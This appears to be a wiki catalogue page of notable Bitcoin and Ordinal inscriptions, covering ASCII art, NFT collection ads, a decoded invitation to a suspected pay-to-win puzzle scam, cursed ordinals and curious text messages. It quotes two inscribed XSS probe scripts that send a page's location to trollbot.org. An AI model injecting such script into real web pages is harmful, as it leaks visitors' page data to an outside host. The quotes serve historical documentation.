             *##%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%%%#%%########((((((((///(##%(((#/(##,*(/#//((/****,...
              *(#%%%&&%&&&&&&&&&&&&&&&&&&&%%%&%%%%%#%#%#%%%#%###(/(((/(//(((/%(((/(////*/**//*****,***,
               ,#&&%%&%%&&&%&&&&&&&&&&%&%%%%%%#%%%%&%&&%&&%%%%###(((/////((###(%(/*/*,/,*,,,******,,,*
              *.&%&&&&&&%%%%%%%%%%%%%%#&%%%%&%&&%%%%%&&#####((##((((////(/###%(#//.**,***//,....,*.
              *%&%&&&&&&&&&%#%##%####(%%%&%&&&&%%(#(%%###(#((((/(////(((((/**..,,,**,**,,..,,,,,,*
              **///(%%&%#%####((#%%#(/((#/(,/(**//**,/%**///(#(/((/**,*.*%((//*/*/,***,,,,,***,,*/
         *,///*/((/**,*,**#%/*,/%&&##/**,***,,,*//((((((///.*..*.,.*(////*//*//**(***,,**////***(*
        *./*  ..##(*,,,,,  ,,*///##*,*/*,.,*,,,,.**..  .,..*,*/*#((///////////(******,,. .*****//
         ((..   (((###((###(//,*(#(/*/*//*//(//(((((((#####(#,/%#((///////////******//,,.,,***/*
          .*..  %%%&%%%%%%####,%&@&%#,/*###(##((###%%%%###%#%./#((//(//******/*****////,**//((/.
           .#,..%%%%%%%%####%%%&&&%%#(*,/#%%%%%%%#####%%%%&&%.#((///////***********////,**/((*,
             ,@,#%%%%%%&&&%%%&&&&&%#####(*(#%&&&&&&&&&&&%&%/#///////***************/*/**/(/*./,
               ((,/(%%###/*/%&&&&%%##(##%%%%//#%#((##/#//////(((((////****************,,,***(/
               .#%%%&&&&%%(%&&&&&&%##(#%##%((#%&%%%&&&&%%%%###((((////*********///***(/////((
                #%%&%&%%%#%&&&&@&%%%###%%##(#(*,//###%#######((((//////****//*///****(//((#(,
                ,###%%#(//%%%%%%%#(//(((///**,./(//*/(((((((((//////**/*****/********.//((/*
                 /((((/*,.///(///*,,.     ..,*((##((/**//////***,,,,**************,,.,,,,*/
                  ////*,.,(##(/*,,    .,*///(##(((//////(***,,,,..,*////******,,,,,,,,,,////.
                   ((**,,,*/(((((//**///((((((((//////******/*,//(//(///****,,,,,,,,,,*////*,.
                    (#####((//*/((((((((((////*/*,,,,,,,**//##(((////(/*,,,,,,,,,,,,,//////*...
                     (#%%%%#(##/*/(///***,,,,..  .,,**/**/#%%##(///*///*,,,,,,,,,,,*///////,,*.
                      .##%%##%#%###(//////#%#(###(/////(#%#%##(///**//*,,,,,,,,,,,////((//***       .. ....
                        (###%##((#####(#(((((((/*////##%%#(##(///*,*//,,,,,,,,,,*/////((////      . ..  .. . ....
                         (##%%%((((#(((/(((/((((//(((#(%##(#(/***,*//,,,,,,,,,**/////(///(.     . .........   .. ....
                   .......,#%&%#((((((#/(((#(((//###%%((#(/((*,,,***,,,,,,.,****///////(/        .......... .............
                .,...,......(%%%%%#%%%%%%%####%%#%%%###(//**,.,,*,,,,,,,,,****///////((  .. ... .......... ..............
              .............../%%%#%##%######%###%###////,,,,...,.,,,,,.**,**/////((((.   . ............... ..............
            ...........,,......############(##(#(/****,,,...,.,,,,,,,*,,,**////((//*    ................. ...............
           ......................((#((((/////***,,,,.,,.,.,,,,,,,,,,,.,,*///((///* ..................... ................
          .............................,*,,,,,,,,,,,,,,,,*,,. .,,,,,,,*/((((/***   ......................................
         ............................  .#&%%%%%%#/,.,,... .,,,,,,,**/((#((/**/,........................ .................
         ............................ .(&&&%%%###(*,**/*,,,,,,***/((###(*////.......................... .................
        ............................../&&&#*  .  .    ////////(((##%#/////(........................... ...........,......
       ............................. ,#,,,,,/ /,  .,  ,##(####%%%#(((/*/#/............................ ...,..............
       ............................ *#****..#, /*. (*, (%%%%##((((///#%(.............................. ..................
      ............................./%&///*...#*.*(/ .*/.##(((((((#%%&&................,.............. ...................
      ............................/%@@@#*..,..     .   , ((((##%%&&&,....................... .   .............,..........
     ...........................,/%@@@@%/,..,.  ,. .  *#%%#%%&&&&&%......................  ........................,.....
     ..........................,/%&@@#* .#((.....* ,(%&&&&&&@@@@@...............................,................. ......
    ..........................,/#&@@*./#,..(/*.*. ,%@@@@@&&&@@@(......,.,...,....,...........,..,........................
   .....................,....,/#&&@(*...&(*,...,#(*&@@@@@@@@@@...................,..............,.......,................
   .........................,/#%&@*##(#.,,...%(*..(@@@@@@@@&.....,............. ...,.............................,.......
  .........................,/#%&@%.#*/*..,#%...(*,%@@@@@&&#.,................. . ............... ........................
  ```

  <a id="image-warren-buffett-photo-from-hist-bill-and-melinda-gates-foundation-profile"></a>
  <img src="https://web.archive.org/web/20240310070145im_/https://www.gatesfoundation.org/-/media/gfo/3about/3people/ga_warren_buffett_20210203_0001.jpg?rev=68ac5cb3b9db4b34aeb5e199666c3149&amp;w=570&amp;hash=723109C3454709A54D1358679C68A61F" alt="" height="500">

  **[Figure 90](#image-warren-buffett-photo-from-hist-bill-and-melinda-gates-foundation-profile). Warren Buffett photo from hist Bill & Melinda Gates Foundation profile**. [Source](https://www.gatesfoundation.org/about/leadership/warren-buffett). Off-chain reference image for the [ASCII art](#ascii-art).

<a id="_880"></a>
Small art as part of an ad for something like a collection or service:<a id="_881"></a>

<a id="_882"></a>
- [tx e00318a4c0769f641ee62cfd8d55ac671d987244762a34895cc29c6142964dd4](https://ordinals.com/inscription/e00318a4c0769f641ee62cfd8d55ac671d987244762a34895cc29c6142964dd4i0): ordinal bears collection header
<a id="_883"></a>
- [tx b0f140eddbe03c98d982524d81ab5beecfee3e135bc658173e38ffd675ca9f08](https://ordinals.com/inscription/b0f140eddbe03c98d982524d81ab5beecfee3e135bc658173e38ffd675ca9f08i0): 999 club
<a id="_884"></a>
- [tx 29a4d4fb8ea570a5e6520c0c6d56bf44d00e5c0028b33f57eb1d2bbda4c467e1](https://ordinals.com/inscription/29a4d4fb8ea570a5e6520c0c6d56bf44d00e5c0028b33f57eb1d2bbda4c467e1i0): "Bitcoin Bots"
<a id="_885"></a>
- [tx 86747b2b5118dd3c3911f8506818af7f6bf102ecd35f854d796021466bc4b548](https://ordinals.com/inscription/86747b2b5118dd3c3911f8506818af7f6bf102ecd35f854d796021466bc4b548i0): "Bad Bunnies" [https://badbunnies.xyz/](https://badbunnies.xyz/) ad
<a id="_886"></a>
- [tx 0fc35f856bfd43e0c939100d9a21beccdac8264db81c0927cb681dcd22628dd6](https://ordinals.com/inscription/0fc35f856bfd43e0c939100d9a21beccdac8264db81c0927cb681dcd22628dd6i0): EspressOrdinals
<a id="_887"></a>
- [tx 65bded5452fb0d158da19652afbee41cbc50c01513f3a50cf3540a059ace6e8a](https://ordinals.com/inscription/65bded5452fb0d158da19652afbee41cbc50c01513f3a50cf3540a059ace6e8ai0): ORDINALIENS [https://twitter.com/ordinaliens](https://twitter.com/ordinaliens)
<a id="_888"></a>
- [tx 72c5d96279012faed9c464e75877186abd21c0fe6f5f00e244a7bd606d515b26](https://ordinals.com/inscription/72c5d96279012faed9c464e75877186abd21c0fe6f5f00e244a7bd606d515b26i0): [https://inscribeords.com](https://inscribeords.com) "Inscribe Ords", an inscrption service
<a id="_889"></a>
- [tx 99e90c6f741921cc6740c4b402dbd69f40d3686be06d18aab39561871ad22b16](https://ordinals.com/inscription/99e90c6f741921cc6740c4b402dbd69f40d3686be06d18aab39561871ad22b16i0): "immordal" [Unicode art](art.md#unicode-art)<a id="_890"></a>

  ```
  Our algorithm is designed to give a rarity score to tweets based on their visibility and interaction.
  We take into account metadata such as views, likes, and retweets, and assign a grade to each category.
  These grades are then used to determine the rarity score of the tweet.
  We believe that this system will create a more just and equitable online community, where individuals
  are rewarded for meaningful contributions, rather than for clickbait or sensationalism.
  ```
<a id="_891"></a>
- [tx 61ab46f60128c36a0dd9f9503711d38eef8737e88e6b78cad7365a54fdac7aa4](https://ordinals.com/inscription/61ab46f60128c36a0dd9f9503711d38eef8737e88e6b78cad7365a54fdac7aa4i0): [https://twitter.com/minidogeart](https://twitter.com/minidogeart) "Ordinal Mini Doges"
<a id="_892"></a>
- [tx 9402c3c7f837353e68fae663027e7251b52820bd10dfd3fb57779c3c4bcb291a](https://ordinals.com/inscription/9402c3c7f837353e68fae663027e7251b52820bd10dfd3fb57779c3c4bcb291ai0): Bitkoingz @BitKoingz

###### We are 256, We are 1

↑ **Parent:** [Ordinal ASCII art inscription](#ordinal-ascii-art-inscription)

<a id="_893"></a>
"WE ARE 256, WE ARE 1" is an invitation to a [Discord](messaging-software.md#discord-software)-based puzzle game with the promise of a money prize of unspecified value in Round 10.

<a id="_894"></a>
It is written as a short mystery story/cult invitation/tabletop RPG with some mysterious Braille [Unicode art](art.md#unicode-art) cabal symbols thrown in, nice work, e.g. the first one:<a id="_895"></a>

```
 ⣤⡀⠀⠀⠠⣤⠀⠀⠀⠀⣤⠀⠀⢠⡄⠀⠀⣤⠀⠀⠀⠀⣤⠄⠀⠀⢀⣤⠀
⠀⠘⢷⣄⠀⠀⠹⣧⡀⠀⠀⢸⡆⠀⢸⡇⠀⢰⡇⠀⠀⢀⣼⠏⠀⠀⣠⡾⠃⠀
⠀⠀⠀⠙⢷⣄⠀⠘⢷⡄⠀⠘⣷⠀⠘⠃⠀⣼⠇⠀⢠⡾⠃⠀⣠⡾⠋⠀⠀⠀
⠀⠻⣦⣀⠀⠻⣧⡀⠈⢿⡄⠀⢿⠄⢀⡀⠠⡿⠀⢠⡿⠁⢀⣼⠟⠀⣀⣴⠟⠀
⠀⠀⠈⠙⢶⣄⠈⠻⣦⡈⢿⡄⠈⢠⣿⣿⡄⠁⢠⡿⢁⣴⠟⠁⣠⡶⠋⠁⠀⠀
⠀⣀⣀⠀⠀⠈⠛⢦⣈⣿⣄⠃⣠⣿⣿⣿⣿⣄⠘⣠⣿⣁⡴⠛⠁⠀⠀⣀⣀⠀
⠀⠈⠙⠛⠷⢦⣤⣀⡉⠻⠋⣰⣿⡿⠿⠿⢿⣿⣆⠙⠟⢉⣀⣤⡴⠾⠛⠋⠁⠀
⠀⢶⣦⣤⣤⣤⣈⣉⣛⠃⢀⣡⡄⢀⡤⠤⠀⢠⣌⡀⠘⣛⣉⣁⣤⣤⣤⣴⡶⠀
⠀⠀⠀⠀⠀⣉⣉⡉⠁⢰⣿⣿⣇⠸⠀⠀⠀⣸⣿⣿⡆⠈⢉⣉⣉⠀⠀⠀⠀⠀
⠀⠛⠛⠉⠉⢉⠉⢁⣤⣈⠛⠻⠿⠷⣤⣤⠾⠿⠟⠛⣁⣤⡈⠉⡉⠉⠉⠛⠛⠀
⠀⣠⣤⡶⠞⠋⢠⣾⣿⣿⣿⣶⣶⣤⣤⣤⣤⣶⣶⣿⣿⣿⣷⡄⠙⠳⢶⣤⣄⠀
⠀⠉⠀⣠⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣄⠀⠉⠀
⠀⢀⣠⡾⠋⣠⠞⠁⣰⡟⠁⢸⡏⠀⢸⡇⠀⢹⡇⠈⢻⣆⠈⠳⣄⠙⢷⣄⡀⠀
⠀⠛⠋⠀⠚⠋⠀⠐⠛⠀⠀⠚⠀⠀⠘⠃⠀⠀⠓⠀⠀⠛⠂⠀⠙⠓⠀⠙⠛⠀
```

<a id="_896"></a>
The game is announced on the following inscriptions from (2023-07-18):<a id="_897"></a>

<a id="_898"></a>
- html: [tx 0b6bf3623d71e75cefd1912ed3de3dabfd27da5f03244ced393758896d85e26b](https://ordinals.com/inscription/0b6bf3623d71e75cefd1912ed3de3dabfd27da5f03244ced393758896d85e26bi0)
<a id="_899"></a>
- plaintext: [tx e8cb31b093f0f40034937b61f114b88f24a13615de5d54f40cd49c7bb1ed5851](https://ordinals.com/inscription/e8cb31b093f0f40034937b61f114b88f24a13615de5d54f40cd49c7bb1ed5851i0)

<a id="_900"></a>
The prize promise is:<a id="_901"></a>


> Amidst the labyrinthine trials, the ultimate test lies in Round 10, where grand prize money riddles await the most skilled and dedicated participants.

There may also be a [pay to win](https://ourbigbook.com/go/topic/pay-to-win) mechanic which is perhaps how the scam works:<a id="_902"></a>


> <a id="_903"></a>
> In this cryptic journey, the number of 256 Ordinals held becomes a key determinant of progress. Those who hold a higher number of Ordinals, standing as sentinels of wisdom, enjoy an edge over others. They are safeguarded from regressing beyond their current round, their position secured by the strength of their holdings.
> 
> <a id="_904"></a>
> However, for those who possess fewer Ordinals, a different fate may await. Purges, shrouded in mystery, can demote participants to lower rounds, challenging them to rise again through determination and resolve. The path to enlightenment demands resilience and the tenacity to overcome setbacks.

<a id="_905"></a>
Finally further down we see some join instructions:<a id="_906"></a>


> V. Whitelist Access and Discord Roles

And finally they give concrete join instructions at:<a id="_907"></a>


> <a id="_908"></a>
> IX. Join the Illuminated Ones
> 
> <a id="_909"></a>
> SW4gdGhlIGhhbGxvd2VkIGNoYW1iZXJzIG9mIDI1NiwgYSBzZWxlY3QgZ3JvdXAgZW1lcmdlcyBmcm9tIHRoZSBkZXB ... XBsZXMgb2YgQml0Y29pbiByZWlnbiBzdXByZW1lLg==

Removing the spaces it is just [Base64](computer.md#base64):<a id="_910"></a>

```
xsel -b | tr -d ' ' | base64 -d
```
giving:<a id="_911"></a>


> <a id="_912"></a>
> In the hallowed chambers of 256, a select group emerges from the depths of knowledge and mastery. As we ascend through the challenging rounds and unravel the enigmas that lie within, a council of visionaries begins to take shape. These luminaries, the Illuminated Ones, are the chosen few who have delved deepest into the mysteries, unlocking the secrets that bind our shared destiny.
> 
> <a id="_913"></a>
> To join the ranks of the Illuminated Ones is to embrace the challenge laid before us. It requires unwavering determination, relentless pursuit of knowledge, and an insatiable curiosity that drives us to unlock the hidden depths of the Watch Tower. As we decode the cryptic puzzles and navigate the labyrinthine maze, we become catalysts of change, shaping the very fabric of our collective future.
> 
> <a id="_914"></a>
> Only the smartest, the most intrepid, and the boldest souls will find themselves welcomed into this secret council. They are the ones who have traversed the treacherous terrain, tested their mettle, and emerged triumphant. With each step forward, they gain insights and wisdom that have the power to reshape the very landscape of the digital realm.
> 
> <a id="_915"></a>
> Curious and courageous souls are invited to join the ranks of the Illuminated Ones. Those who dare to challenge the boundaries of what is known and venture into the realm of the unknown are the ones who will find their rightful place among the visionaries and leaders of the 256 community. Together, we wield the power to shape our shared destiny, to create a future where decentralization, privacy, and the principles of Bitcoin reign supreme.

so perhaps there is a hidden message in that text to actually access the Discord?

<a id="_916"></a>
This is the collection on [Magic Eden](cryptocurrency.md#magic-eden): [https://magiceden.io/ja/ordinals/marketplace/256](https://magiceden.io/ja/ordinals/marketplace/256), which contains links:<a id="_917"></a>

<a id="_918"></a>
- [https://discord.com/invite/SxsQ4xh6P2](https://discord.com/invite/SxsQ4xh6P2) (invite invalid as of April 2024)
<a id="_919"></a>
- [https://twitter.com/WEARE256BTC](https://twitter.com/WEARE256BTC) (this account does not exist as of April 2024) Mentioned e.g. at: [https://twitter.com/Dworfz/status/1684301131806015489](https://twitter.com/Dworfz/status/1684301131806015489)

###### Cursed ordinal

↑ **Parent:** [Technically interesting ordinal](#technically-interesting-ordinal)

<a id="_920"></a>
These were ordinals that were only indexed in later versions of the script. So to prevent changing the useless indices of existing ordinals, they gave them negative numbers.

<a id="_921"></a>
The word "cursed" is a meme from the 2010/20s, e.g. [https://knowyourmeme.com/memes/cursed-images--2](https://knowyourmeme.com/memes/cursed-images--2).

<a id="_922"></a>
Some examples:<a id="_923"></a>

<a id="_924"></a>
- [https://ordinals.com/inscription/4b9a822a057743813efbefa0dd21d0a01342ee793ce2ce5bd499a5f262187553i0](https://ordinals.com/inscription/4b9a822a057743813efbefa0dd21d0a01342ee793ce2ce5bd499a5f262187553i0) first inscription with no mime type.
<a id="_925"></a>
- [https://ordinals.com/inscription/2fa287270e4203ca2fc9f82ea3de7a0f7b785875791a76387ef6f4ccbb54eee2i0](https://ordinals.com/inscription/2fa287270e4203ca2fc9f82ea3de7a0f7b785875791a76387ef6f4ccbb54eee2i0) is -38:<a id="_926"></a>
  > Hello World, this is a Rust Taproot test

  is bugged because it is missing the mime type, on [Python](programming-language.md#python-programming-language):<a id="_927"></a>

  ```
  [b"'a\xf9\x19X%\xa8Q\x87SP\xe5\xf2H\xa6\xeew\x0e\x81\xa5hl\xcd\xaa\x97e\xfeqJ\x16\x12?", OP_CHECKSIG, 0, OP_IF, b'ord', 1, b'text/plain', 0, b'Hello World, this is a Rust Taproot test\xe2\x80\xa6', OP_ENDIF]
  ```

  because the `1` should instead be `b'\x01`.

<a id="_928"></a>
Bibliography:<a id="_929"></a>

<a id="_930"></a>
- [https://decrypt.co/212908/mysterious-ordinals-inscription-teases-cursed-bitcoin-art-project](https://decrypt.co/212908/mysterious-ordinals-inscription-teases-cursed-bitcoin-art-project)

##### Ordinal ruleset inscription collection

↑ **Parent:** [Ordinal ruleset inscription](#ordinal-ruleset-inscription)

<a id="_931"></a>
This section is about groups of [ordinal ruleset inscription](#ordinal-ruleset-inscription) that share a theme and were presumably created by a single entity.

###### OnChainMonkey

↑ **Parent:** [Ordinal ruleset inscription collection](#ordinal-ruleset-inscription-collection)

<a id="_932"></a>
[https://onchainmonkey.com/](https://onchainmonkey.com/)

<a id="_933"></a>
From their site:<a id="_934"></a>


> OCM Genesis is our flagship generative art collection that's set many historic precedents since its launch in 2021. Genesis is the first NFT collection where all 10,000 images and metadata (similar to DNA describing the NFT) were generated using code entirely on-chain in a single transaction on Ethereum. With the launch of Bitcoin Ordinals, Genesis is the first ever collection of 10,000 images to be inscribed on Bitcoin in 2023.

<a id="_935"></a>
Some of their likely transactions were noted in our list of large transactions: [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/payload_size_out](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/payload_size_out) e.g.:<a id="_936"></a>

```
004c3f1efa0095b229dd05ea247c94a5af742daf682fb082a6e62f4aeeb973f2 66033
ffc73ef454d512f98a451960e05a0a036406ed1078a1bd7082fd4036cf0af067 66021
```
but we haven't had the patience to index them properly yet. Boring art anyways.

###### Taproot Wizards

↑ **Parent:** [Ordinal ruleset inscription collection](#ordinal-ruleset-inscription-collection)

<a id="_938"></a>
<a id="_939"></a>
- [https://taprootwizards.com/](https://taprootwizards.com/)
<a id="_940"></a>
- [https://twitter.com/TaprootWizards](https://twitter.com/TaprootWizards)

<a id="_941"></a>
[https://www.coindesk.com/tech/2024/01/12/taproot-wizards-bitcoin-ordinals-project-that-raised-75m-to-sell-quantum-cats-collection/](https://www.coindesk.com/tech/2024/01/12/taproot-wizards-bitcoin-ordinals-project-that-raised-75m-to-sell-quantum-cats-collection/):<a id="_942"></a>


> Taproot Wizards, Bitcoin Ordinals Project That Raised $7.5M, to Sell 'Quantum Cats' Collection"

OMG if only the worlds wouldn't invest in such useless crap... it would probably be a better and more boring world.

### Text

↑ **Parent:** [Media type](#media-type)

<a id="_943"></a>
Here are some exceptionally interesting text inscriptions that are not mentioned in other sections:<a id="_944"></a>

<a id="_945"></a>
- [Section "Genesis block message"](cryptocurrency.md#genesis-block-message)
<a id="_946"></a>
- [tx 3a1c1cc760bffad4041cbfde56fbb5e29ea58fda416e9f4c4615becd65576fe7](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0230.txt#L705) ([2013-04-10](https://www.blockchain.com/explorer/transactions/btc/3a1c1cc760bffad4041cbfde56fbb5e29ea58fda416e9f4c4615becd65576fe7)) has the broken Basic creature simulation mentioned at [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014) section "A creature simulator in Basic" starting with:<a id="_947"></a>

  ```
  10 REM The variables in life
  20 ' life the lifespan of a creature
  30 ' mates the number of mates a creature needs to breed
  ```
<a id="_948"></a>
- [tx 61e26d407c17e8ee33a8b166c78f78c53cdcdc0078ae1f9405e6583cfb90eaf4](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0268.txt#L10), [block 268081](https://www.blockchain.com/explorer/transactions/btc/61e26d407c17e8ee33a8b166c78f78c53cdcdc0078ae1f9405e6583cfb90eaf4) (2013-11-05). This is a very interesting transaction, it contains inscriptions both on the [input script](cryptocurrency.md#bitcoin-input-script) and on the [output script](cryptocurrency.md#bitcoin-output-script). On the input:<a id="_949"></a>
  > I should not run the washing machine while listening to WZBC. I managed to convince myself that the machine was slowly failing -- that a rythmic, squeaking noise it had been making had gotten a little worse. Ten minutes later, though, the machine had paused. But the noise was still there.

  On the output:<a id="_950"></a>

  ```
  > Skynet went online on August 4th 1997, and began to learn at a geometric rate.
  > It became self-aware on August 29th 1997 2:14 am Eastern Time. On August 29th
  > 1997 2:15 am it discovered nihilism, and either shut itself down due to
  > despair, or because it was logical. We're not sure which.

  On August 4th, 1998, it failed to renew its domain name, which was promptly
  squatted on by a link farmer pitching X10 cameras and singing electric fish.
  ```

  Feels like a [Koan](religion.md#koan). I wish I knew who inscribed this.
<a id="_951"></a>
- [tx 4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0305.txt) block 305806 ([2014-06-14](https://www.blockchain.com/explorer/transactions/btc/4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af)) contains a [blockchain explorer](cryptocurrency.md#blockchain-explorer) [XSS](software.md#cross-site-scripting) detector that reports its location back to: [http://www.trollbot.org/xss-blockchain-detector.php](http://www.trollbot.org/xss-blockchain-detector.php)<a id="_952"></a>

  ```
  <script type='text/javascript'>document.write('<img src='http://www.trollbot.org/xss-blockchain-detector.php?href=' + location.href + ''>');</script>
  ```

  Soon afterwards at tx a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24 block 305809 there is a different version with slightly different escaping:<a id="_953"></a>

  ```
  <script type='text/javascript'>document.write('<img src=\'http://www.trollbot.org/xss-blockchain-detector.php?bc=btc&href=' + location.href + '\'>');</script>
  ```

  Also of interest, the [output script](cryptocurrency.md#bitcoin-output-script) of [4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af](cryptocurrency.md#4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af) is non standard and a [provably unspendable Bitcoin output script](cryptocurrency.md#provably-unspendable-bitcoin-output-script). [a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24](cryptocurrency.md#a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24) however, although also non-standard, was spendable and was spent, further analysis at: [Section "4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af"](cryptocurrency.md#4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af).
<a id="_954"></a>
- [tx 713a6832365a68f71c6aee879f79b70e6e738cd6255f09bc41f204c81575c248](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0322.txt#L688) ([2014-09-28](https://www.blockchain.com/explorer/transactions/btc/713a6832365a68f71c6aee879f79b70e6e738cd6255f09bc41f204c81575c248)) via [cryptograffiti.info](#cryptograffiti-info) has the [eleven rules of LaVevan Stanism](https://en.wikipedia.org/wiki/LaVeyan_Satanism#The_Eleven_Satanic_Rules_of_the_Earth) starting with:<a id="_955"></a>
  > 1. Do not give opinions or advice unless you are asked.
<a id="_956"></a>
- [tx 604f17dfdb5a88fc072bd2bcf53436087c899051241e519af7241dc0037d3df6](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0332.txt#L389) ([2014-12-01](https://www.blockchain.com/explorer/transactions/btc/604f17dfdb5a88fc072bd2bcf53436087c899051241e519af7241dc0037d3df6)) has a cover letter for a job at [Hive Blockchain Technologies Ltd](https://www.hiveblockchain.com/):<a id="_957"></a>
  > Dear hive team, ever since I have discovered Bitcoin I have been a fan of your products. \[...\]. Sincerely, Tim Daubenschuetz

  At [https://news.ycombinator.com/item?id=26826334](https://news.ycombinator.com/item?id=26826334) the supposed author mentions they didn't reply... sad. He did get to work for another Blockchain company though: [https://www.ascribe.io](https://www.ascribe.io), which eventually died. Presumably [https://github.com/TimDaub](https://github.com/TimDaub).
<a id="_958"></a>
- [tx 213e8f46f98e96f4f4d8b45bd3a1cbada14213796c200220e1e8c2b315988faa](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0349.txt#L818) ([2015-03-25](https://www.blockchain.com/explorer/transactions/btc/213e8f46f98e96f4f4d8b45bd3a1cbada14213796c200220e1e8c2b315988faa))<a id="_959"></a>
  > Warning! Kaspersky Alerts Users of Malware and 'Blockchain Abuse'

  contains a full-text copy of: [http://cointelegraph.com/news/113806/warning-kaspersky-alerts-users-of-malware-and-blockchain-abuse](http://cointelegraph.com/news/113806/warning-kaspersky-alerts-users-of-malware-and-blockchain-abuse) (2015-03-27), includinga link to it. Two other copies appear in future transactions tx c863aa9d6aa9345e4abdc216b6f035c4276b4423a924bb2e1593c22c670cba6f and tx ba58caf1a27ab7ca627cc3efa5914e4d37e00b3a7e9cf29508d451dc3da00bf7
<a id="_960"></a>
- [tx 3405f441f0d3acd8580d261d58e5a14d7638d0ee29200e673f496198d231edd7](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0364.txt#L1721) block 364852 ([2015-07-11](https://www.blockchain.com/explorer/transactions/btc/3405f441f0d3acd8580d261d58e5a14d7638d0ee29200e673f496198d231edd7)) and a nearby transaction on the same block 1759ed3f0f5829711157c1fc3662f4bf01f3bee3a430242bc729898bb77c2a4a via [cryptograffiti.info](#cryptograffiti-info) contains a possibly novel long short story entitled:<a id="_961"></a>

  ```
  How to Play Chinese Hats
     - A Short Story -
           2015
  ```

  The first paragraph is:<a id="_962"></a>
  > Somehow, you find yourself in a dim and smoky room with no entrance, exit or windows, without knowing how you got there or even where you've come from. In front of you are a group of Chinese gentlemen shuffling around what looks to be traditional black Chinese hats styled after the Ming dynasty, on a circular chestnut wood table. Surprisingly, you find the same type of hat in your very own hand when you look down.

  At the end we see a signature and a tipjar:<a id="_963"></a>

  ```
  Ren @ 1LQGWkhE7GULhj2gjjRwB9uZR7SMfGvjGV
  ```

  He did receive one tipin 2015 for 0.02590000 BTC: [https://www.blockchain.com/explorer/addresses/BTC/1LQGWkhE7GULhj2gjjRwB9uZR7SMfGvjGV](https://www.blockchain.com/explorer/addresses/BTC/1LQGWkhE7GULhj2gjjRwB9uZR7SMfGvjGV)
<a id="_964"></a>
- [tx 0b63ebfadcb7bb66bc2a4bc7b826587505eab0450ca64c376ac9912a00d35c54](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0371.txt#L1658) block 371796 ([2015-08-27](https://www.blockchain.com/explorer/transactions/btc/0b63ebfadcb7bb66bc2a4bc7b826587505eab0450ca64c376ac9912a00d35c54)) via [cryptograffiti.info](#cryptograffiti-info) has a large text entitled with what seems to be a storm forecast:<a id="_965"></a>
  > TROPICAL STORM ERIKA INTERMEDIATE ADVISORY NUMBER  11A

  A [Wikipedia](website.md#wikipedia) page about the August 2015 event: [https://en.wikipedia.org/wiki/Tropical_Storm_Erika](https://en.wikipedia.org/wiki/Tropical_Storm_Erika)<a id="_966"></a>
  > Tropical Storm Erika was one of the deadliest and most destructive natural disasters in Dominica since Hurricane David in 1979.

  The storm was formed "August 24, 2015", so this inscription was contemporary. Good friend, warning his fellow Bitcoiners.
<a id="_967"></a>
- <a id="_968"></a>
  [tx 4dd57f3e443ad1567a37beab8f6b31d8cb1328a26bac09e50ba96048ad07b8c1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0372.txt#L2565) ([2015-09-03](https://www.blockchain.com/explorer/transactions/btc/4dd57f3e443ad1567a37beab8f6b31d8cb1328a26bac09e50ba96048ad07b8c1)) via [cryptograffiti.info](#cryptograffiti-info) contains a long [porn](#porn) comededy text in an Italian-like languge starting with:<a id="_969"></a>


  > E il cazzo non entr

  which translates to:<a id="_970"></a>


  > And the dick doesn't fit

  .  
  By dumping the transaction data, we actually see that the beginning was slightly missed due to a [character encoding](telecommunication.md#character-encoding) issue, the text actually starts with:<a id="_971"></a>


  > BANG!

  followed by some non ASCII characters that we haven't yet been able to decode. It is not [ISO\_8859-1](telecommunication.md#iso-8859-1).

  <a id="_972"></a>
  [Ciro Santilli](ciro-santilli.md) first thought it might beto be a dialect of Italian, or possibly [Sicilian language](https://en.wikipedia.org/wiki/Sicilian_language) given the presence of "sv" in the text, but an [Italian](continent.md#italy) friend says it is just Italian with several words cut in half, possibly for comedic effect. No pre-existing hits found on the web.
<a id="_973"></a>
- [tx 24e137d5b478d9a8b947e4f3f6130a86f2e0f6a2dda1cac1373b485c577f8ba7](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0386.txt#L785) ([2015-12-03](https://www.blockchain.com/explorer/transactions/btc/24e137d5b478d9a8b947e4f3f6130a86f2e0f6a2dda1cac1373b485c577f8ba7)) contains a tale of an Electrical Engineer vs a [Software developer](software.md#software-development) tale.<a id="_974"></a>
  > Once upon a time, in a kingdom not far from here

  Possible original: [https://www.cs.brandeis.edu/~hornby/amuse/vs_toast.txt](https://www.cs.brandeis.edu/~hornby/amuse/vs_toast.txt)
<a id="_975"></a>
- [tx e2c20c2977589240ad9486672a0273d340ed5f8b50a50071716d12035d7212e8](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0396.txt#L61) (2016-01-31) has a large [Lorem ipsum](art.md#lorem-ipsum)
<a id="_976"></a>
